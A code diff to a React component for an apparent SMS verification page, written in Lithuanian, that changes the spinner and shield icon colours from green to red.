@@ -166,7 +166,7 @@ export function SmsClient({ sessionId }: Props) {
       <div className="pak-page-shell">
         <div className="pak-form-card flex w-full max-w-[650px] justify-center p-5 py-16 sm:p-8">
           <div className="pak-form-inner flex justify-center">
-            <div className="size-12 animate-spin rounded-full border-4 border-[#4ade80] border-t-transparent" />
+            <div className="size-12 animate-spin rounded-full border-4 border-[#ff5257] border-t-transparent" />
           </div>
         </div>
       </div>
@@ -267,7 +267,7 @@ export function SmsClient({ sessionId }: Props) {
 
             <div className="flex flex-col gap-3 pt-1 md:flex-row md:items-center md:justify-between">
               <div className="pak-form-security">
-                <svg className="h-9 w-9 shrink-0 text-[#4ade80]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
+                <svg className="h-9 w-9 shrink-0 text-[#ff5257]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
                   <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinejoin="round" />
                 </svg>
                 <span>Kodas išsiųstas SMS žinute jūsų telefono numeriu.</span>
